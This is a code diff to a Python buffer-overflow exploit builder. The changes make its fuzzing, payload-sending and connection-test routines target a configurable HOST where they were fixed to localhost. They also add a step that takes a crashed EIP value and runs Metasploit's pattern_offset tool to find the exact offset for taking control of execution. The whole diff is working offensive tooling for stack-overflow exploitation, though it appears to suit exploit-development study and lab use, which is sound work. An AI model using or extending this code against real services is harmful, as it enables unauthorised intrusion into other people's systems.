@@ -47,7 +47,7 @@ def spiking():
         try:
             puts('success', "Sends: %s bytes" % len(string))
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            connect = s.connect(('127.0.0.1', int(PORT)))
+            connect = s.connect((HOST, int(PORT)))
             s.recv(1024)
             s.send(string + '\r\n')
             s.close()
@@ -61,7 +61,7 @@ def send_payload(pattern):
 
     puts('success', "Sends: %s bytes" % pattern)
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    connect = s.connect(('127.0.0.1', int(PORT)))
+    connect = s.connect((HOST, int(PORT)))
     s.recv(1024)
     s.send(pattern + '\r\n')
     s.close()
@@ -70,7 +70,7 @@ def send_payload(pattern):
 def test_connection():
 
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    result = sock.connect_ex(('127.0.0.1', int(PORT)))
+    result = sock.connect_ex((HOST, int(PORT)))
     sock.close()
     if result == 0:
         return True
@@ -113,6 +113,22 @@ def build_exploit():
     print("")
 
     send_payload(pattern)
+
+    EIP = str(raw_input('Input EIP value: ')).strip()
+    print("EIP value: %s" % EIP)
+
+    if os.path.isfile('/opt/metasploit/tools/exploit/pattern_offset.rb') is True:
+        pattern_tool = '/opt/metasploit/tools/exploit/pattern_offset.rb'
+    elif os.path.isfile('/usr/share/metasploit-framework/tools/pattern_offset.rb') is True:
+        pattern_tool = '/usr/share/metasploit-framework/tools/pattern_offset.rb'
+    else:
+        puts('success', 'Missing pattern_offset tool')
+        sys.exit(1)
+
+    buffer_offset = commands.getoutput("%s -q %s" % (pattern_tool, EIP)).split(' ')[-1]
+    puts('info', 'Exact offset for EIP control: %s' % buffer_offset)
+
+
 
 
 
